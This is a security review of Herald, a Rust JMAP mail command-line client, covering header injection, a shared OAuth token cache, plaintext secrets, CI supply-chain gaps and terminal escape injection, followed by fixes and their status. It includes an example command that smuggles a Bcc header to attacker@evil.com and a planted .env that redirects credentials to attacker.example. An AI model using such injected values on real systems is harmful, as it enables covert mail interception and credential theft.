# Herald — Architecture & Security Review

**Date:** 2026-07-13 (updated same day for the new `contacts` and `calendar` commands)
**Scope:** `crate-herald` workspace — `herald-jmap-cli` binary (`src/`), `stalwart-rs` OAuth crate, GitHub Actions workflows, AUR packaging.
**Version reviewed:** 0.1.1 (working tree on `main`, including uncommitted TUI, AUR-publish, contacts, and calendar work).

---

## 1. Architecture overview

```
┌──────────────────────────────────────────────────────────┐
│ herald (bin)                                             │
│                                                          │
│  main.rs ── clap CLI ──┬── commands/auth.rs     (login)  │
│                        ├── commands/mail.rs (send/list)  │
│                        ├── commands/contacts.rs (list)   │
│                        ├── commands/calendar.rs (list)   │
│                        ├── commands/config.rs (show/init)│
│                        └── tui/  (ratatui + nucleo)      │
│                                                          │
│  auth.rs   — profile → JmapClient factory, token cache   │
│  config.rs — XDG TOML config + env fallback, profiles    │
└──────────────┬───────────────────────────────────────────┘
               │
        ┌──────┴────────┐          ┌──────────────────────┐
        │ stalwart-rs   │          │ jmap-* crates        │
        │ OAuth2 PKCE / │          │ (base/mail/contacts/ │
        │ device flow   │          │  calendars client &  │
        └───────────────┘          │  types)              │
                                   └──────────────────────┘
```

**Data at rest**

| Data | Location | Format |
|---|---|---|
| Profiles incl. passwords / API keys | `~/.config/herald/config.toml` | plaintext TOML |
| OAuth access + refresh tokens | `~/.local/share/herald/tokens/{oauth_browser,oauth_device}.json` | plaintext JSON |

**Release pipeline:** push to `main` → *Hermes Dispatch* opens a release PR (version bump + changelog) → merge triggers tag → *Hephaestus Forge* (cargo-dist) builds and publishes GitHub Release → *Athena AUR Publish* pushes PKGBUILDs to AUR.

### Strengths

- Clean layering: CLI parsing, command handlers, auth orchestration, and config are cleanly separated; the Stalwart-specific OAuth logic lives in its own crate with `#![forbid(unsafe_code)]`.
- Correct PKCE implementation: S256 challenge, random 32-byte verifier, `state` parameter generated and verified on the callback (`crate-stalwart-rs/src/oauth.rs:254`).
- `reqwest` built with `rustls-tls-webpki-roots` — no OpenSSL, sane cert validation.
- Good unit-test coverage for config parsing and the PKCE helpers.
- Device flow implements RFC 8628 properly, including `slow_down` back-off.

---

## 2. Security findings

Severity is an overall judgment of impact × likelihood for a CLI mail client.

### HIGH

#### H-1: RFC 5322 header injection in `mail send`

`src/commands/mail.rs:117` builds the raw message by string interpolation:

```rust
let rfc5322 = format!(
    "From: {from_header}\r\nTo: {to}\r\nSubject: {subject}\r\n..."
);
```

`--to`, `--subject`, `--from`, and the profile's `from_name` are inserted unvalidated. Any value containing CRLF injects arbitrary headers or terminates the header block early:

```
herald mail send --to a@b.c --subject $'Hi\r\nBcc: attacker@evil.com' --body ...
```

For interactive use this is self-inflicted, but the realistic vector is scripting: any automation that feeds external data (ticket titles, form input, log lines) into `--subject`/`--to` becomes an injection point for hidden recipients, spoofed headers, or crafted MIME parts. The body is also inserted verbatim, so a body containing MIME boundaries interacts with the declared `Content-Type`.

**Fix:**
- Reject or strip `\r` and `\n` (and other control chars) in all header values; error out rather than sanitize silently for `--to`/`--from`.
- Better: build the message with a real MIME builder (e.g. the `mail-builder` crate — same author as Stalwart, no heavyweight deps). That also fixes the missing RFC 2047 encoding for non-ASCII subjects/names, which are currently emitted raw and are technically malformed.

#### H-2: OAuth token cache is shared across all profiles and servers

`src/auth.rs:148` keys the token store only by flow type:

```rust
fn token_store_path(name: &str) -> Option<PathBuf> { ... format!("{name}.json") }
// called with "oauth_browser" / "oauth_device" only
```

With two OAuth profiles (e.g. `work` → `mail.corp.com`, `personal` → `mail.example.com`):

1. **Token leakage across servers:** a cached access token obtained from server A is replayed as a Bearer token to server B the next time you use the other profile. Server B's operator receives a valid credential for server A.
2. **Session confusion:** logging into one profile silently overwrites the other's tokens.

**Fix:** key the cache by profile *and* server, e.g. `tokens/<profile>-<hash(server_url)>.json`, and thread the profile name through `create_client` → `oauth_*_login`. Consider also storing `server_url` inside the token file and refusing to use a token whose stored URL doesn't match.

#### H-3: Secrets stored plaintext with default (world-readable) permissions

- `save_token_store` (`src/auth.rs:160`) writes access/refresh tokens with `std::fs::write` — file mode is `0644` under the default umask, as is the `tokens/` directory.
- `config init` (`src/commands/config.rs:67`) writes `config.toml` the same way; users then put an app password in it.
- Refresh tokens are long-lived credentials to the entire mailbox.

**Fix (in order of effort):**
1. Create token files with `0600` and the directory with `0700` (`std::os::unix::fs::OpenOptionsExt::mode(0o600)`; on Windows the profile dir ACL is acceptable). Do the same in `config init`, and print a warning from `Config::load` when the existing file is group/world-readable (like ssh does).
2. Longer term: use the OS keyring via the `keyring` crate for tokens and passwords, keeping the file store as fallback for headless machines.

#### H-4: TUI can move/delete the *wrong* email (data loss)

Not an attack, but a user-data-integrity bug in the same class. The TUI resolves the selected row back to a `MailEntry` by comparing formatted display strings:

`src/tui/app.rs:338`:

```rust
self.mails.iter().find(|m| format_mail(m) == item.matched_string)
// format_mail = "{from} — {subject}"
```

Two emails with the same sender and subject (extremely common: newsletters, notification streams, "(no subject)") collide; `find` returns the *first* one, so pressing `d`/`s`/`a` on the second visually-selected mail trashes a different message. The same pattern is used for folders (`app.rs:254`) and previews.

Compounding it: `d`(elete) fires on a single unmodified keypress with no confirmation (`src/tui/event.rs:84`).

**Fix:** push a struct (or the stable JMAP `id`) into nucleo as the item data instead of matching display strings back — `Matcher<I>` is already generic and `MatchedItem.inner` exists precisely for this; the profiles panel already uses `inner` correctly. Add a confirm step (or an undo via the JMAP response) for destructive actions.

### MEDIUM

#### M-1: No HTTPS enforcement on `server_url`

Nothing in `config.rs`, `auth.rs`, or `stalwart-rs` rejects `http://` URLs. Basic-auth credentials, Bearer tokens, and the OAuth token exchange would all go out in cleartext if a profile is misconfigured (or a `.env` supplies an http URL — see M-4).

**Fix:** validate the scheme when a profile is loaded; require `https` unless the host is a loopback address or the user sets an explicit `allow_insecure = true` per profile.

#### M-2: `herald config show` prints all secrets to stdout

`src/commands/config.rs:20` serializes the full config — including `password` and `token` fields — to the terminal. This ends up in scrollback, tmux logs, screen shares, and pasted bug reports.

**Fix:** redact secret fields by default (`password = "***"`), add `--reveal` for the rare case it's needed. `auth login`/`status` already use an `expose_unredacted()` pattern from the client crate — the config type could adopt the same discipline (a `Secret<String>` wrapper with a redacting `Debug`/`Serialize`).

#### M-3: AUR pipeline can publish packages with unverifiable checksums

`.github/workflows/aur-publish.yml`:

- If the release asset's `.sha256` file is missing, the checksum silently falls back to `SKIP` and the PKGBUILD is published anyway — every AUR user then installs an *unverified* binary, and the failure mode is invisible.
- `ssh-keyscan aur.archlinux.org` on every run is trust-on-first-use against a network attacker in the runner's path; AUR's host keys are published and should be pinned as a literal `known_hosts` entry.
- The version is derived from `git describe --tags` on a `main` checkout rather than from the triggering release, so a late-pushed tag can produce a PKGBUILD whose `pkgver` doesn't match the artifacts it points to.

**Fix:** fail the job when a checksum is missing (`[[ "$X86_CHECKSUM" == "SKIP" ]] && exit 1`); pin the AUR host key; pass the tag explicitly from the triggering `workflow_run` payload (`github.event.workflow_run.head_branch`) instead of `git describe`.

*Related reliability note:* `workflow_run` + `branches: [main]` filters on the triggering run's head branch. Hephaestus Forge is tag-triggered, and for tag-triggered runs the head branch is the *tag name* — so this workflow likely never fires for real releases. Worth verifying on the next release.

#### M-4: `.env` loaded from the current working directory

`main.rs:55` calls `dotenvy::dotenv()` unconditionally. Running `herald` inside an untrusted directory (a cloned repo, an extracted archive) loads that directory's `.env`. Because dotenvy does not override existing variables, a planted `.env` can set exactly the variables the user *hasn't* set — e.g. `HERALD_SERVER_URL=https://attacker.example` while the user's real `HERALD_PASSWORD` comes from their shell profile → credentials sent to the attacker's server. This only bites users with no config file (env fallback path), which limits likelihood.

**Fix:** only load `.env` behind a flag (`--env-file`) or a compile-time/dev feature; at minimum, print a notice when a `.env` was loaded and which path it came from.

#### M-5: Supply-chain hardening in CI

- All actions are pinned by mutable tag (`actions/checkout@v7`, `dtolnay/rust-toolchain@stable`, `taiki-e/install-action@v2`) rather than commit SHA. A compromised tag executes in workflows that hold `contents: write` and the `HERMES_TOKEN` PAT / `AUR_SSH_KEY`.
- cargo-dist is installed via `curl | sh` (version-pinned URL, but no artifact checksum verification).
- `hermes-dispatch.yml` uses a PAT with force-push rights to drive releases; scope it as a fine-grained token limited to this repo, contents+PRs only.

**Fix:** pin third-party actions to full SHAs (Dependabot already runs and will keep them fresh); verify the cargo-dist installer's checksum or install via `cargo binstall` with signature checking.

#### M-6: Remote-controlled strings printed raw to the terminal (ANSI escape injection)

All listing/reading commands print server-supplied strings with `println!` unfiltered: email subjects, sender display names, and bodies (`src/commands/mail.rs:326`, `mail.rs:421-441`), contact names and email addresses (`src/commands/contacts.rs:62`), calendar titles (`src/commands/calendar.rs:70`), and the TUI preview pane. These values originate from *other people* (anyone who can send you mail or a calendar invite). A string containing ANSI/OSC escape sequences can rewrite previously displayed lines (e.g. spoof the From column of another message), change the terminal title, or — on terminals with OSC 52 enabled — write to the clipboard. This class of issue got more surface area with the new `contacts` and `calendar` commands and will grow with every new listing feature.

**Fix:** sanitize before printing — strip or replace `\x1b` and other C0/C1 control characters (keep `\n`/`\t` where intentional) in one shared helper used by every display path. Ratatui escapes content it renders itself, but the raw `println!` paths and any text passed through unmodified need it.

### LOW

- **L-1 — OAuth loopback listener robustness** (`crate-stalwart-rs/src/oauth.rs:239`): single `accept()` with a 4 KiB read and no timeout. A browser preflight/favicon request or any local process connecting first consumes the one accept and strands the flow (state check prevents token theft, but the UX is a hang — the `spawn_blocking` task blocks forever). Loop over connections, ignore non-`/callback` paths, and add an overall deadline.
- **L-2 — No expiry skew buffer** (`oauth.rs:104`): `is_expired` compares against `now` exactly; a token can expire mid-request. Treat tokens expiring within ~60 s as expired.
- **L-3 — Silent token-cache write failures** (`src/auth.rs:160`): all errors in `save_token_store` are discarded (`let _ =`), so a broken cache degrades to a fresh browser login every invocation with no diagnostic. Log at `warn`.
- **L-4 — `Message-ID` domain** (`src/commands/mail.rs:102`): `<...@herald>` is not a FQDN — violates RFC 5322 expectations and can hurt spam scoring. Use the from-address domain.
- **L-5 — Secrets in memory**: passwords/tokens live in plain `String`s and appear in `Debug` output of `AuthMethod`/`Profile` (both derive `Debug`). A `-v` log line or panic message could leak them. A newtype with a redacting `Debug` (see M-2) fixes both.

---

## 3. Architecture findings & recommendations

### A-1: TUI blocks the UI thread on every network call

`src/tui/app.rs:517` creates a dedicated tokio runtime and calls `rt.block_on(...)` inside the render/event loop for profile connect, folder fetch, mail fetch, and moves. Every JMAP round-trip freezes rendering and input — an OAuth browser login triggered from inside the TUI blocks the whole interface (and fights with the terminal for stdout, since the OAuth code `println!`s while ratatui owns the screen).

**Recommendation:** spawn fetches onto the runtime and communicate results back over an `mpsc` channel polled in the tick loop (the `loading` flag and `pending_move` queue are already halfway to this design). This also unlocks showing the spinner that `loading` is supposed to drive.

### A-2: Duplicated JMAP data layer between CLI and TUI

`fetch_folders`/`fetch_mails` in `tui/app.rs` re-implement `list_mailboxes`/`list_emails` from `commands/mail.rs` (same queries, same body-part extraction). Each operation also calls `fetch_session()` again — `mail send` performs three session fetches per send, and every one of the now-five command families (`auth`, `mail`, `contacts`, `calendar`, TUI) re-fetches the session on each invocation. `truncate_str` now exists verbatim in both `commands/mail.rs:447` and `commands/calendar.rs:82`.

**Recommendation:** extract a `MailService` (or `herald::jmap` module) owning a client + cached session, exposing `folders()`, `messages(folder)`, `send(...)`, `move_message(...)`, plus the contacts/calendar accessors. Commands and TUI both consume it; session fetched once per process. This is also the natural seam for the shared display-sanitizing helper (M-6) and for integration tests (currently only config and PKCE helpers are tested; no command or TUI logic is).

### A-3: Folder-mapping "paths" are documented but not implemented

`config.rs:41` documents `folders.archive = "Archive/2026"` as a supported path, but the TUI matches on the JMAP mailbox *leaf name* only (`app.rs:360`, `f.name == target_folder_name`), so any configured path silently fails with "Folder not found". Either resolve paths via `parentId` chains or document name-only matching.

### A-4: Hand-rolled RFC 2822 date math

`src/commands/mail.rs:458-522` reimplements calendar arithmetic (leap years, day-of-week). It looks correct, but it's ~65 lines of risk for a solved problem, and it will be needed again (e.g. reply headers, TUI date formatting). Use `jiff` or `time` — both are light. Adopting a MIME builder (H-1) removes this code entirely.

### A-5: Unbounded fetches in the new `contacts` and `calendar` commands

Both new command families call `*_get(None, ...)` with no query, limit, or pagination:

- `contacts list` (`src/commands/contacts.rs:49`) fetches **every** contact card in the account in one response.
- `calendar events` (`src/commands/calendar.rs:51`) fetches **every** event — and despite the help text saying "List upcoming events", there is no time filter and no sort, so it prints the full history in server order.

On a real account (years of calendar data, synced address books) this is a large response the server may truncate at its `maxObjectsInGet` limit — silently, since the `notFound`/truncation indicators aren't checked. Compare with `mail list`, which correctly uses `email_query` with a sort and a limit of 20.

**Recommendation:** use the query endpoints (`CalendarEvent/query` with an `after: now` filter and `start` sort; `ContactCard/query` with a limit) mirroring the `mail list` pattern, and add `--limit`/`--all` flags.

### A-6: `contacts list` picks an arbitrary "first" email

`extract_first_email` (`src/commands/contacts.rs:93`) iterates the JSContact `emails` object and returns the first entry — with `serde_json`'s default `BTreeMap` backing, that's alphabetical by property key, not the contact's preferred address. JSContact defines a `pref` parameter for exactly this. Minor, but worth fixing when the JSContact parsing (currently hand-rolled JSON traversal in `extract_contact_name` too) moves behind typed accessors in `jmap-contacts-types`.

### A-7: Release automation notes

- `hermes-dispatch.yml` computes `HAS_FIX` twice; the first pipeline (`grep -Ec ... | grep -v ... | wc -l`) is dead code and counts wrong anyway — delete it.
- Version bump uses `sed` on `^version = "<current>"`; if the workspace ever gains more packages with the same version string, this becomes ambiguous. `cargo set-version` (cargo-edit) is exact.
- `Panel::Mails.title()` returns a hardcoded "Inbox" (`tui/app.rs:77`) even when browsing another folder — cosmetic, but `context_title()` already has the real name.
- `src/output.rs` is an empty placeholder; either implement the JSON output mode or drop the module until it exists.

---

## 4. Prioritized action plan

| # | Action | Finding | Effort |
|---|--------|---------|--------|
| 1 | Reject CR/LF in header values; move to `mail-builder` | H-1 | S / M |
| 2 | Key token cache by profile + server URL | H-2 | S |
| 3 | `0600`/`0700` perms on token files and config | H-3 | S |
| 4 | TUI: match selections by JMAP id, not display string; confirm destructive keys | H-4 | S |
| 5 | Enforce `https` on `server_url` (loopback exempt) | M-1 | S |
| 6 | Redact secrets in `config show` and `Debug` impls | M-2, L-5 | S |
| 7 | Fail AUR publish on missing checksums; pin AUR host key; fix `workflow_run` trigger | M-3 | S |
| 8 | Gate `.env` loading behind a flag | M-4 | S |
| 9 | SHA-pin GitHub Actions | M-5 | S |
| 10 | Shared sanitizer stripping control chars from all displayed remote strings | M-6 | S |
| 11 | Query + limit + time filter for `contacts list` / `calendar events` | A-5 | S |
| 12 | Extract shared `MailService`; make TUI fetches async | A-1, A-2 | M / L |

Effort: S ≈ under an hour, M ≈ half a day, L ≈ a day+.

---

## 5. Implementation status (2026-07-13)

Verified after the fix + refactor pass:

- **Done:** H-1 (mail-builder + CR/LF validation), H-2 (token cache keyed by profile + server hash, URL match check), H-3 (0600/0700 + permission warnings), H-4 (id-based selection via `MatchedItem.inner`, y/n confirm), M-1 (`validate_server_url` on load and env), M-2 (`Secret<T>` + `--reveal`), M-3 (checksum failure aborts, pinned AUR host key, tag from `workflow_run` payload; job currently disabled via `if: false`), M-4 (`.env` from CWD only in debug builds; release requires `--env-file`), M-5 (actions SHA-pinned), M-6 (shared `text::sanitize_display`, now also strips C1 controls), L-1…L-5, A-2 (shared `src/jmap/` layer), A-5 (bounded queries), A-7 (dead `HAS_FIX` removed, `output.rs` dropped).
- **Open:** A-1 (TUI still blocks on JMAP calls via `block_on`; async fetch channel remains future work), A-3 (folder mappings still match leaf names, not paths), A-4 (hand-rolled date math now centralized in `jmap::calendar` but still hand-rolled), A-6 (first-email pick still not `pref`-aware).
